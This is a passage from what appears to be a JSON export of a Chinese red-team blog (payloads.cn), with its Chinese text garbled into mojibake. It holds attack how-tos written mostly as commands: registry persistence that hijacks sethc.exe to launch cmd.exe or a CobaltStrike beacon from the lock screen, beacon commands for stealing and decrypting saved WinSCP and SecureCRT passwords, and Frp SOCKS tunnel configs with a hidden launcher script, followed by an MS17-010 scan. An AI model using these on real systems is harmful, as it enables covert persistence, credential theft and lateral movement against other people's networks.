Optionsï¼‰ï¼Œç®€å•çš„è¯´æ³•ï¼Œå°±æ˜¯å½“ä½ æ‰“å¼€çš„æ˜¯ç¨‹åºAï¼Œè€Œè¿è¡Œçš„ç¡®æ˜¯ç¨‹åºBã€‚ æ˜ åƒåŠ«æŒå…¶å®æ˜¯Windowså†…è®¾çš„ç”¨æ¥è°ƒè¯•ç¨‹åºçš„åŠŸèƒ½ï¼Œä½†æ˜¯ç°åœ¨å´å¾€å¾€è¢«ç—…æ¯’æ¶æ„åˆ©ç”¨ã€‚å½“ç”¨æˆ·åŒå‡»å¯¹åº”çš„ç¨‹åºåï¼Œæ“ä½œç³»ç»Ÿå°±ä¼šç»™å¤–å£³ç¨‹åºï¼ˆä¾‹å¦‚â€œexplorer.exeâ€ï¼‰å‘å¸ƒç›¸åº”çš„æŒ‡ä»¤ï¼Œå…¶ä¸­åŒ…å«æœ‰æ‰§è¡Œç¨‹åºçš„è·¯å¾„å’Œæ–‡ä»¶åï¼Œç„¶åç”±å¤–å£³ç¨‹åºæ¥æ‰§è¡Œè¯¥ç¨‹åºã€‚äº‹å®ä¸Šåœ¨è¯¥è¿‡ç¨‹ä¸­ï¼ŒWindowsè¿˜ä¼šåœ¨æ³¨å†Œè¡¨çš„ä¸Šè¿°è·¯å¾„ä¸­æŸ¥è¯¢æ‰€æœ‰çš„æ˜ åƒåŠ«æŒå­é”®ï¼Œå¦‚æœå­˜åœ¨å’Œè¯¥ç¨‹åºåç§°å®Œå…¨ç›¸åŒçš„å­é”®ï¼Œå°±æŸ¥è¯¢å¯¹åº”å­å¥ä¸­åŒ…å«çš„â€œDubuggerâ€é”®å€¼åï¼Œå¹¶ç”¨å…¶æŒ‡å®šçš„ç¨‹åºè·¯å¾„æ¥ä»£æ›¿åŸå§‹çš„ç¨‹åºï¼Œä¹‹åæ‰§è¡Œçš„æ˜¯é­åˆ°â€œåŠ«æŒâ€çš„è™šå‡ç¨‹åºã€‚ ç®€å•æµ‹è¯•æ˜ åƒåŠ«æŒæŠ€æœ¯çš„åˆ©ç”¨ï¼Œå­˜åœ¨å·²ä¹…ï¼Œè¿™é‡Œå†ç®€å•è¯´æ˜ä¸‹ï¼šä¿®æ”¹æ³¨å†Œè¡¨HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Optionsä¸‹sethc.exeï¼Œæ·»åŠ ä¸€ä¸ªDebuggerå­—ç¬¦å€¼ï¼ˆREG_SZï¼‰ï¼Œå¹¶ä¸”èµ‹å€¼ä¸ºcmd.exeçš„æ‰§è¡Œè·¯å¾„ä¸ºC:\\windows\\system32\\cmd.exe ä¹‹åé”®å…¥äº”ä¸‹Shiftæ‰§è¡Œsethc.exeç¨‹åºæ—¶ä¾¿ä¼šæ‰§è¡Œcmd.exeç¨‹åºã€‚ æ˜ åƒåŠ«æŒåé—¨æ–°ç©æ³•å®ç°æ•ˆæœé”®å…¥äº”ä¸‹Shiftæ‰§è¡Œæ—¶ï¼Œå…ˆæ‰§è¡Œsethc.exeç¨‹åºï¼Œå½“sethc.exeç¨‹åºé™é»˜é€€å‡ºæ—¶ï¼Œæ‰§è¡ŒCobaltStrikeçš„Powershellï¼Œåå¼¹Beacon shell ã€‚ ç®€å•æ¥è¯´å°±æ˜¯ï¼šç¨‹åºAé™é»˜é€€å‡ºç»“æŸåï¼Œä¼šæ‰§è¡Œç¨‹åºBã€‚ GFlagesæµ‹è¯•æ–‡ç« åœ°å€ï¼š https://blogs.msdn.microsoft.com/junfeng/2004/04/28/image-file-execution-options/ ä¸‹è½½gflags.exe https://docs.microsoft.com/zh-cn/previous-versions/msdn10/gg463016(v=msdn.10) æ ¹æ®å¾®è½¯çš„å®˜æ–¹æ–‡æ¡£æè¿°ï¼Œåœ¨Silent Process Exité€‰é¡¹å¡ä¸­çš„é…ç½®ï¼Œéƒ½ä¿å­˜åœ¨æ³¨å†Œè¡¨ä¸­ã€‚ GFlagså·¥å…·è‡ªåŠ¨æ·»åŠ å¹¶ä¿®æ”¹äº†â€œIFEOâ€ç›®å½•ä¸‹sethc.exeçš„GlobalFlagå€¼ã€‚ ä»¥åŠSilentProcessExitä¸‹ReportingModeå’ŒMonitorProcessä¸¤ä¸ªå€¼ã€‚ è¿™æ—¶æµ‹è¯•ä¼šå‘ç°ï¼Œå½“é”®å…¥äº”ä¸‹Shiftæ—¶ï¼Œå…ˆæ‰§è¡Œsethc.exeç¨‹åºï¼Œå½“sethc.exeç¨‹åºé™é»˜é€€å‡ºæ—¶ï¼Œä¾¿ä¼šæ‰§è¡Œcmd.exeç¨‹åºã€‚ è¿™ä¹ˆä¸€æ¥ï¼Œå¯ä»¥ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­å¯¹æ³¨å†Œè¡¨è¿›è¡Œè®¾ç½®ã€‚ï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰ 1234reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot; /freg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot; /v GlobalFlag /t REG_DWORD /d 512 /freg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\sethc.exe&quot; /v ReportingMode /t REG_DWORD /d 1 /freg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\sethc.exe&quot; /v MonitorProcess /t REG_SZ /d &quot;c:\\windows\\system32\\cmd.exe&quot; /f ç®€å•è§£é‡Šä¸€ä¸‹ReportingModeå’ŒMonitorProcess è¿™ä¸¤ä¸ªé¡¹å€¼çš„ä½œç”¨ã€‚MonitorProcessçš„å€¼è¡¨ç¤ºç›‘è§†å™¨è¿›ç¨‹ã€‚Reporting Modeå¯ä»¥è®¾ç½®ä¸ºä¸‰ä¸ªå€¼ ã€‚ Flag Value è§£é‡Š LAUNCH_MONITORPROCESS 0x1 æ£€æµ‹åˆ°è¿›ç¨‹é™é»˜é€€å‡ºæ—¶ï¼Œå°†ä¼šå¯åŠ¨ç›‘è§†å™¨è¿›ç¨‹ï¼ˆåœ¨GFLAGS.exeä¸­ï¼ŒSilent Process Exitè¿™ä¸ªé€‰é¡¹å¡æ‰€å¡«å†™çš„å€¼ï¼Œå³MonitorProcessçš„é¡¹å€¼ï¼‰ LOCAL_DUMP 0x2 æ£€æµ‹åˆ°è¿›ç¨‹é™é»˜é€€å‡ºæ—¶ï¼Œå°†ä¼šä¸ºå—ç›‘è§†çš„è¿›ç¨‹åˆ›å»ºè½¬å‚¨æ–‡ä»¶ NOTIFICATION 0x4 æ£€æŸ¥åˆ°è¿›ç¨‹é™é»˜é€€å‡ºæ—¶ï¼Œå°†ä¼šå¼¹å‡ºä¸€ä¸ªé€šçŸ¥ ä¸CobaltStrikeç»“åˆåˆ©ç”¨æ¢ä½æ€è€ƒï¼Œç”¨ä¸Šè¿°çš„æ–¹æ³•ï¼Œä¿®æ”¹MonitorProcesså€¼æ”¾å…¥CobaltStrikeçš„powershellã€‚è¿™æ ·ï¼Œå¯ä»¥åœ¨æ¸—é€ä¸­åšåˆ°æƒé™çš„ç»´æŒï¼ŒæŒ‰äº”ä¸‹Shiftå°±å¯ä»¥éšè”½è¿›è¡Œåè¿ã€‚ å®æµ‹ï¼ŒWindowsé”å±ï¼Œé”®å…¥äº”ä¸‹Shiftåæ­£å¸¸å¼¹ç²˜æ»é”®ï¼Œå…³é—­ä¹‹åæ‰§è¡Œpowershellä»£ç ï¼Œåå¼¹beaconçš„shellã€‚","categories":[{"name":"æƒé™ç»´æŒ","slug":"æƒé™ç»´æŒ","permalink":"https://payloads.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://payloads.cn/tags/Windows/"}]},{"title":"è§£å¯†Winscpå®¢æˆ·ç«¯ä¸­ä¿å­˜çš„å¯†ç hash","slug":"è§£å¯†Winscpå®¢æˆ·ç«¯ä¸­ä¿å­˜çš„å¯†ç hash","date":"2019-12-04T14:08:50.000Z","updated":"2021-07-07T07:15:15.247Z","comments":true,"path":"2019/1204/.html","link":"","permalink":"https://payloads.cn/2019/1204/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn å‰è¨€WinSCPæ˜¯ä¸€ä¸ªWindowsç¯å¢ƒä¸‹ä½¿ç”¨çš„SSHçš„å¼€æºå›¾å½¢åŒ–SFTPå®¢æˆ·ç«¯ã€‚åŒæ—¶æ”¯æŒSCPåè®®ã€‚å®ƒçš„ä¸»è¦åŠŸèƒ½æ˜¯åœ¨æœ¬åœ°ä¸è¿œç¨‹è®¡ç®—æœºé—´å®‰å…¨åœ°å¤åˆ¶æ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥ç›´æ¥ç¼–è¾‘æ–‡ä»¶ã€‚è€Œæˆ‘ä»¬çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†è¯»å–é‡Œé¢å„ç§çš„SSHè¿æ¥å¯†ç ã€‚ æ‰€æœ‰æ“ä½œå…¨éƒ¨åœ¨ç®¡ç†å‘˜æƒé™ä¸‹è¿›è¡Œ æœ€æ–°ç‰ˆWinscpä¸ºä¾‹é€šè¿‡powershellè„šæœ¬æå®šï¼Œæˆ–è€…RDPç›´æ¥ç™»å½•è¿æ¥æŸ¥è¯¢ç­‰ã€‚ ã€Œç»¿è‰²ç‰ˆæ— å®‰è£…è®°å½•ã€ 12beacon&gt; powershell-import &#x2F;Users&#x2F;anonysec&#x2F;ListInstalledPrograms.ps1beacon&gt; powershell Get-list å‰æï¼Œç›®æ ‡å¾—äº‹å…ˆä¿å­˜è¿æ¥å¯†ç ã€‚ ç¡®å®šWinscpå­˜å‚¨ä½ç½®é»˜è®¤æƒ…å†µä¸‹ï¼ŒWinscpé…ç½®ä¼šå­˜å‚¨åœ¨Windowså¯¹åº”çš„æ³¨å†Œè¡¨é¡¹ä¸‹ï¼ˆåŒ…æ‹¬äº†è¿æ¥çš„IPã€ç”¨æˆ·åã€å¯†ç Hashï¼‰ã€‚ HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\ å…·ä½“è§£å¯†è¿‡ç¨‹ æŸ¥çœ‹Winscpé…ç½®çš„Windowsæ³¨å†Œè¡¨ï¼ˆæ³¨å†Œè¡¨é¡¹æ˜¯å›ºå®šçš„ï¼‰ï¼Œå¦‚æœæœ‰è¿æ¥ä¼šè¯ï¼Œå†æŒ‡å®šæŸ¥è¯¢è¿æ¥ä¸‹æ‰€ä¿å­˜çš„å¯†ç Hashã€‚ 12beacon&gt; shell reg query &quot;HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions&quot;beacon&gt; shell reg query &quot;HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\root@192.168.144.128&quot; å°†æŸ¥åˆ°çš„ä¿¡æ¯æ‹·è´åˆ°æœ¬åœ°çš„winscppwd.exeè¿›è¡Œè§£å¯†ã€‚ RDPç›´æ¥ç™»å½•ç›®æ ‡ï¼Œå¯¼å‡ºWinscpé…ç½®æ–‡ä»¶ï¼Œå¹¶ä¸‹è½½åˆ°æœ¬åœ°è¿›è¡Œè§£å¯†ã€‚(å¦‚æœæ‰¾åˆ°é…ç½®çš„iniæ–‡ä»¶ï¼Œç›´æ¥æŠŠå¯¹åº”æ–‡ä»¶downæœ¬åœ°è¿›è¡Œè§£å¯†å³å¯) é™„è„šæœ¬å·¥å…· ListInstalledPrograms.ps1 winscppwd.exe","categories":[{"name":"å¯†ç æœé›†","slug":"å¯†ç æœé›†","permalink":"https://payloads.cn/categories/%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86/"}],"tags":[{"name":"è§£å¯†å®¢æˆ·ç«¯","slug":"è§£å¯†å®¢æˆ·ç«¯","permalink":"https://payloads.cn/tags/%E8%A7%A3%E5%AF%86%E5%AE%A2%E6%88%B7%E7%AB%AF/"}]},{"title":"è§£å¯†SecureCRTå®¢æˆ·ç«¯ä¸­ä¿å­˜çš„å¯†ç hash","slug":"è§£å¯†SecureCRTå®¢æˆ·ç«¯ä¸­ä¿å­˜çš„å¯†ç hash","date":"2019-12-04T14:08:30.000Z","updated":"2021-08-30T03:37:15.579Z","comments":true,"path":"2019/1204/.html","link":"","permalink":"https://payloads.cn/2019/1204/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn å‰è¨€SecureCRTæ˜¯è¿ç»´äººå‘˜å¸¸ç”¨çš„ç®¡ç†å·¥å…·ã€‚ä½†ç”±äºæŸäº›è¿ç»´äººå‘˜çš„å®‰å…¨æ„è¯†ä¸é«˜ï¼Œå¹³æ—¶å¾ˆå¯èƒ½ä¼šæŠŠSSHçš„è¿æ¥å¯†ç éƒ½ä¿å­˜åœ¨é‡Œé¢ï¼Œè¿™å°±ç»™äº†æ¸—é€äººå‘˜å¯ä¹˜ä¹‹æœºï¼Œä¸ºåç»­è·¨å¹³å°æ¨ªå‘ç§»åŠ¨åšäº†å‡†å¤‡ã€‚è€Œæˆ‘ä»¬çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†è§£å¯†ä¿å­˜åœ¨SecureCRTä¸­çš„è¿™äº›SHHè¿æ¥å¯†ç ï¼Œå¹¶é€šè¿‡è¿™ç§æ–¹å¼å®ç°Windowsåˆ°Linuxä¹‹é—´çš„å¿«é€Ÿæ¨ªå‘æ¸—é€ã€‚ æ‰€æœ‰æ“ä½œå…¨éƒ¨åœ¨ç®¡ç†å‘˜æƒé™ä¸‹è¿›è¡Œï¼Œè§£å¯†è„šæœ¬ä»…é™äº SecureCRT 7.x ä»¥ä¸‹ç‰ˆæœ¬ï¼Œé«˜ç‰ˆæœ¬éœ€è¦ä½¿ç”¨æ–‡ç« æœ«çš„æ–¹æ³•ã€‚å¦‚æœSecureCRTæœ‰å¯åŠ¨å¯†ç ï¼ŒConfigåŠ å¯†äº†ï¼Œå°±ä¸è¦æäº†ã€‚ ç¡®å®šç›®æ ‡SecureCRTçš„è¯¦ç»†ç‰ˆæœ¬æƒ³åŠæ³•ç¡®å®šSecureCRTçš„è¯¦ç»†ç‰ˆæœ¬ï¼Œé€šè¿‡powershellè„šæœ¬æå®šï¼Œæˆ–è€…ç›´æ¥RDPç™»å½•è¿æ¥æŸ¥è¯¢ç­‰ ã€Œç»¿è‰²ç‰ˆæ— å®‰è£…è®°å½•ã€ã€‚å‘ç°ç›®æ ‡æ‰€ç”¨çš„è¯¦ç»†ç‰ˆæœ¬ä¸º 7.1.1ï¼ˆbuild 264ï¼‰ã€‚ 12beacon&gt; powershell-import &#x2F;Users&#x2F;anonysec&#x2F;ListInstalledPrograms.ps1beacon&gt; powershell Get-list ç¡®å®šSecureCRTé…ç½®æ–‡ä»¶ç›®å½•ä¸‹çš„Sessionsç›®å½•é»˜è®¤æƒ…å†µä¸‹ï¼ŒSecureCRTçš„Configç›®å½•è·¯å¾„ä¸ºï¼š%APPDATA%\\VanDyke\\Config\\Sessions\\ å¦‚æœæ— æ³•ç¡®å®šè·¯å¾„ï¼Œå¯ä»¥é€šè¿‡å›¾å½¢ç•Œé¢åœ¨SecureCRTèœå•çš„å…¨å±€é€‰é¡¹ä¸­æ¥ç¡®è®¤ã€‚ Sessionsç›®å½•ä¸‹çš„æ¯ä¸ªiniæ–‡ä»¶éƒ½ä¼šä»¥è¿æ¥çš„IPæˆ–åŸŸåæ¥å‘½åã€‚ 1beacon&gt;shell dir %APPDATA%\\VanDyke\\Config\\Sessions\\ æ‹·è´ä¸‹è½½Sessionsç›®å½•çš„iniæ–‡ä»¶ç›´æ¥åˆ°Sessionsç›®å½•ä¸‹è½½iniæ–‡ä»¶å¯èƒ½ä¼šæœ‰é—®é¢˜ï¼ˆåº”è¯¥ç¨‹åºå ç”¨ï¼‰ï¼Œå³ä½¿ä¸‹è½½ä¸‹æ¥ï¼Œåˆ°æœ¬åœ°å¯èƒ½æ— æ³•è§£å¯†ã€‚æ‰€ä»¥ï¼Œå…ˆç”¨Invoke-NinjaCopy.ps1è„šæœ¬æŠŠiniæ–‡ä»¶å…ˆcopyåˆ°å…¶ä»–ç›®å½•ï¼Œç„¶åå†å»ä¸‹è½½ã€‚ 1234beacon&gt; powershell-import &#x2F;Users&#x2F;anonysec&#x2F;Invoke-NinjaCopy.ps1beacon&gt; powershell Invoke-NinjaCopy -Path &quot;C:\\Users\\r00t\\AppData\\Roaming\\VanDyke\\Config\\Sessions\\192.168.144.128.ini&quot; -LocalDestination &quot;c:\\windows\\temp\\192.168.144.128.ini&quot;beacon&gt; shell dir c:\\windows\\temp\\192.168.144.128.ini beacon&gt; download c:\\windows\\temp\\192.168.144.128.ini è„šæœ¬è§£å¯†Sessionå°†ä¸‹è½½çš„iniæ–‡ä»¶æ‹·è´åˆ°æœ¬åœ°ï¼Œåˆ©ç”¨è„šæœ¬è¿›è¡Œè§£å¯†ã€‚ç¯å¢ƒï¼špython 2.7ã€pycryptoåº“ã€‚æ­¤å¤„è§£å¯†è„šæœ¬ä»…é™äº SecureCRT 7.x ä»¥ä¸‹çš„ç‰ˆæœ¬ï¼ 1sudo pip2 install pycrypto 1python SecureCRT-decryptpass.py 192.168.144.128.ini SecureCRTé«˜ç‰ˆæœ¬è§£å†³å¦‚æœç›®æ ‡çš„SecureCRTç‰ˆæœ¬è¾ƒé«˜ï¼Œæ— æ³•è¿›è¡Œè§£å¯†è¯¥æ€ä¹ˆåŠï¼Ÿæ­¤å¤„ä»¥ 8.5.3ï¼ˆX64 build 1867ï¼‰ä¸ºä¾‹ï¼Œç›´æ¥æŠŠå¯¹åº”%APPDATA%\\VanDyke\\Config\\ æ•´ä¸ªç›®å½•æ‹·è´åˆ°æœ¬æœºSecureCRTçš„Configç›®å½•ä¸‹ï¼Œç„¶åç›´æ¥è¿æ¥ã€‚ ç›®æ ‡SecureCRTç‰ˆæœ¬ä¸æœ¬åœ°ç‰ˆæœ¬éœ€ä¸€è‡´ï¼Œå¦åˆ™å¯èƒ½ä¼šå‡ºç°é—®é¢˜ã€‚ é™„è„šæœ¬ ListInstalledPrograms.ps1 Invoke-NinjaCopy.ps1 SecureCRT-decryptpass.py","categories":[{"name":"å¯†ç æœé›†","slug":"å¯†ç æœé›†","permalink":"https://payloads.cn/categories/%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86/"}],"tags":[{"name":"è§£å¯†å®¢æˆ·ç«¯","slug":"è§£å¯†å®¢æˆ·ç«¯","permalink":"https://payloads.cn/tags/%E8%A7%A3%E5%AF%86%E5%AE%A2%E6%88%B7%E7%AB%AF/"}]},{"title":"Frpå†…ç½‘ç©¿é€å®æˆ˜","slug":"Frpå†…ç½‘ç©¿é€å®æˆ˜","date":"2019-12-04T14:07:28.000Z","updated":"2021-07-07T07:16:21.401Z","comments":true,"path":"2019/1204/.html","link":"","permalink":"https://payloads.cn/2019/1204/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn å‰è¨€å®æˆ˜ä¸­ï¼Œå½“é€šè¿‡æŸç§æ–¹å¼æ‹¿ä¸‹ç›®æ ‡æœºå™¨æƒé™æ—¶ï¼Œå‘ç°è¯¥æœºå™¨å¯å‡ºç½‘ã€‚æ­¤æ—¶ä¸ºäº†å†…ç½‘æ¨ªå‘æ¸—é€ä¸å›¢é˜Ÿé—´çš„ååŒä½œæˆ˜ï¼Œå¯ä»¥åˆ©ç”¨Frpåœ¨è¯¥æœºå™¨ä¸VPSä¹‹é—´å»ºç«‹ä¸€æ¡â€œä¸“å±é€šé“â€ï¼Œå¹¶å€ŸåŠ©è¿™æ¡é€šé“è¾¾åˆ°å†…ç½‘ç©¿é€çš„æ•ˆæœã€‚å®æˆ˜ä¸­æ›´å¤šæ—¶å€™ä¾é  Socks5 ã€‚ æ›´å¤šè¯¦ç»†ä½¿ç”¨æ–¹æ³•ï¼Œå¯æŸ¥çœ‹å®˜æ–¹Githubï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚ https://github.com/fatedier/frp/ å‰æœŸå‡†å¤‡å…ˆå‡†å¤‡ä¸€å°VPSä¸åŸŸåã€‚ å› æŸç§æƒ…å†µä¼šæ›´æ¢VPSåœ°å€ï¼Œä¸ºäº†å‡å°‘æ›´æ”¹frpé…ç½®æ–‡ä»¶çš„æ¬¡æ•°ï¼Œæ‰€ä»¥åšåŸŸåæ³›è§£æã€‚è‹¥æ›´æ¢VPSï¼Œç›´æ¥ç¼–è¾‘åŸŸåè§£æåœ°å€å³å¯ã€‚ ä¸‹è½½åœ°å€Frpä¸‹è½½åœ°å€ [è·¨å¹³å°ï¼Œå®æˆ˜ä¸­æ ¹æ®ç›®æ ‡æœºç‰ˆæœ¬é€‰æ‹©ä¸‹è½½] https://github.com/fatedier/frp/releases é…ç½®æ–‡ä»¶æœåŠ¡ç«¯12345678910111213141516171819202122232425262728293031323334353637383940#é€šç”¨é…ç½®æ®µ[common]#frpæœåŠ¡ç«¯ç›‘å¬ [VPS]bind_addr = 0.0.0.0#frpæœåŠ¡å™¨ç›‘å¬ç«¯å£ [å®æˆ˜ä¸­å¯ä»¥ç”¨ä¸€äº›é€šé€æ€§è¾ƒå¥½çš„ç«¯å£]bind_port = 7007#æœåŠ¡ç«¯Webæ§åˆ¶é¢æ¿ç™»å½•ç«¯å£ [é€šè¿‡æ§åˆ¶é¢æ¿ï¼Œå¯ä»¥å®æ—¶äº†è§£åˆ°æ•°æ®æ”¶å‘æƒ…å†µã€‚å®æˆ˜ä¸­ç”¨å¤„ä¸å¤§]dashboard_port = 6609#æœåŠ¡ç«¯Webæ§åˆ¶é¢æ¿ç”¨æˆ·åä¸å¯†ç  [å¼ºå£ä»¤]dashboard_user = SuperMandashboard_pwd = WC3pvjmh2tt8#æ—¥å¿—è¾“å‡ºä½ç½®ï¼Œæ‰€æœ‰çš„æ—¥å¿—ä¿¡æ¯éƒ½æ”¾åˆ°å½“å‰ç›®å½•ä¸‹çš„frps.logæ–‡ä»¶ä¸­log_file = ./frps.log#æ—¥å¿—è®°å½•ç­‰çº§ï¼Œæœ‰traceã€debugã€infoã€warnã€error,é€šå¸¸æƒ…å†µä¸‹ä¸ºinfolog_level = info #æ—¥å¿—ä¿ç•™æ—¶é—´log_max_days = 3#éªŒè¯å‡­æ®ï¼ŒæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯çš„å‡­æ®å¿…é¡»ä¸€æ ·æ‰èƒ½è¿æ¥auth_token = E0iQEBOdoJeh#å¯ç”¨ç‰¹æƒæ¨¡å¼ï¼Œä»v0.10.0ç‰ˆæœ¬å¼€å§‹é»˜è®¤å¯ç”¨ç‰¹æƒæ¨¡å¼ [ç‰¹æƒæ¨¡å¼ä¸‹ï¼Œå®¢æˆ·ç«¯æ›´æ”¹é…ç½®æ— éœ€æ›´æ–°æœåŠ¡ç«¯] privilege_mode = true#ç‰¹æƒæ¨¡å¼Token [å¼ºå£ä»¤ï¼Œå»ºè®®éšæœºç”Ÿæˆ]privilege_token = kukezkHC8R1H#ç‰¹æƒæ¨¡å¼å…è®¸åˆ†é…çš„ç«¯å£ [é¿å…ç«¯å£è¢«æ»¥ç”¨] privilege_allow_ports = 4000-50000#å¿ƒè·³æ£€æµ‹è¶…æ—¶æ—¶é•¿ heartbeat_timeout = 30#æ¯ä¸ªä»£ç†å¯ä»¥è®¾ç½®çš„è¿æ¥æ± ä¸Šé™max_pool_count = 20#å£ä»¤è®¤è¯è¶…æ—¶æ—¶é—´ï¼Œä¸€èˆ¬ä¸ç”¨æ”¹authentication_timeout = 900#æŒ‡å®šå­åŸŸåï¼Œåç»­å°†å…¨éƒ¨ç”¨åŸŸåçš„å½¢å¼è¿›è¡Œè®¿é—® [ç‰¹æƒæ¨¡å¼éœ€ä¸‹å°† *.xxxx.online è§£æåˆ°å¤–ç½‘VPSä¸Šï¼Œå³åŸŸåæ³›è§£æ] subdomain_host = xxxx.online å®¢æˆ·ç«¯1234567891011121314151617181920212223242526272829303132333435#é€šç”¨é…ç½®æ®µ[common]#frpæœåŠ¡ç«¯IPæˆ–åŸŸå [å®æˆ˜ä¸­ä¸€èˆ¬éƒ½ä¼šç›´æ¥ç”¨åŸŸå] server_addr = frp.xxxx.online#frpæœåŠ¡å™¨ç«¯å£server_port = 7007#æˆæƒtokenï¼Œæ­¤å¤„å¿…é¡»ä¸æœåŠ¡ç«¯ä¿æŒä¸€è‡´ï¼Œå¦åˆ™æ— æ³•å»ºç«‹è¿æ¥ auth_token = E0iQEBOdoJeh#å¯ç”¨ç‰¹æƒæ¨¡å¼ [ç‰¹æƒæ¨¡å¼ä¸‹æœåŠ¡ç«¯æ— éœ€é…ç½®] privilege_mode = true#ç‰¹æƒæ¨¡å¼ token,åŒæ ·è¦ä¸æœåŠ¡ç«¯å®Œå…¨ä¿æŒä¸€è‡´ privilege_token = kukezkHC8R1H#å¿ƒè·³æ£€æŸ¥é—´éš”ä¸è¶…æ—¶æ—¶é—´heartbeat_interval = 10 heartbeat_timeout = 30#è¿æ¥æ•°é‡ pool_count = 20#å†…ç½‘ç©¿é€é€šå¸¸ç”¨socks5[socks5]type = tcp#è¿æ¥VPSå†…ç½‘ç©¿é€çš„è¿œç¨‹è¿æ¥ç«¯å£remote_port = 9066#ä½¿ç”¨æ’ä»¶socks5ä»£ç†plugin = socks5#å¯ç”¨åŠ å¯† [é€šä¿¡å†…å®¹åŠ å¯†ä¼ è¾“ï¼Œæœ‰æ•ˆé˜²æ­¢æµé‡è¢«æ‹¦æˆª]use_encryption = true#å¯ç”¨å‹ç¼© [ä¼ è¾“å†…å®¹è¿›è¡Œå‹ç¼©ï¼Œæœ‰æ•ˆå‡å°ä¼ è¾“çš„ç½‘ç»œæµé‡ï¼ŒåŠ å¿«æµé‡è½¬å‘é€Ÿåº¦ï¼Œä½†ä¼šé¢å¤–æ¶ˆè€—ä¸€äº›CPUèµ„æº]use_compression = true#socks5è¿æ¥å£ä»¤ [æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œé…ç½®]#plugin_user = SuperMan#plugin_passwd = ZBO0McQe6mE1 æ‰§è¡Œéƒ¨ç½²æœåŠ¡ç«¯SSHè¿æ¥åˆ°VPSä¸Šï¼Œåå°å¯åŠ¨frpæœåŠ¡ç«¯ã€‚ 1234root@Ubuntu:~# cd tools/frp/root@Ubuntu:~/tools/frp# nohup ./frps -c frps.ini &amp;root@Ubuntu:~/tools/frp# jobs -lroot@Ubuntu:~/tools/frp# cat frps.log å®¢æˆ·ç«¯å°†frpc.exeä¸frpc.iniä¼ åˆ°ç›®æ ‡æœºçš„åŒä¸€ç›®å½•ä¸‹ï¼Œç›´æ¥è¿è¡Œã€‚ å½“frpå®¢æˆ·ç«¯å¯åŠ¨åï¼Œæ˜¯å¦æˆåŠŸè¿æ¥ï¼Œéƒ½ä¼šåœ¨frpæœåŠ¡ç«¯æ—¥å¿—ä¸­æŸ¥çœ‹åˆ°ã€‚ ä½†å¦‚æœç›´æ¥åœ¨ç›®æ ‡æœºçš„Beaconä¸­å¯åŠ¨frpå®¢æˆ·ç«¯ï¼Œä¼šæŒç»­æœ‰æ—¥å¿—è¾“å‡ºï¼Œå¹¶å¹²æ‰°è¯¥pidä¸‹çš„å…¶ä»–æ“ä½œï¼Œæ‰€ä»¥å¯ç»“åˆexecuteåœ¨ç›®æ ‡æœºæ— è¾“å‡ºæ‰§è¡Œç¨‹åºã€‚ 123beacon&gt; sleep 10beacon&gt; execute c:&#x2F;frpc.exe -c c:&#x2F;frpc.inibeacon&gt; shell netstat -ano |findstr 7007 æˆ–è€…ï¼Œåˆ›å»ºåå°è¿è¡Œçš„batè„šæœ¬ã€‚ 12345@echo off if &quot;%1&quot; == &quot;h&quot; goto begin mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;%~nx0 h&quot;,0)(window.close)&amp;&amp;exit :begin c:\\frpc.exe -c c:\\frpc.ini å·¥å…·ç©¿é€Metasploitå½“â€œä¸“å±é€šé“â€æ‰“é€šåï¼Œå¯ç›´æ¥åœ¨msfä¸­æŒ‚è¯¥ä»£ç†ã€‚å› ä¸ºmsfçš„æ¨¡å—è¾ƒå¤šï¼Œæ‰€ä»¥åœ¨å†…ç½‘æ¨ªå‘ç§»åŠ¨ä¸­æ›´æ˜¯ä¸€æŠŠåˆ©å™¨ã€‚ [è‹¥socks5è®¾ç½®å£ä»¤ï¼Œå¯ç»“åˆproxychains] 123456# sudo msfconsole -qmsf5 &gt; setg proxies socks5:frp.xxxx.online:9066msf5 &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set threads 10msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 192.168.144.178msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; run 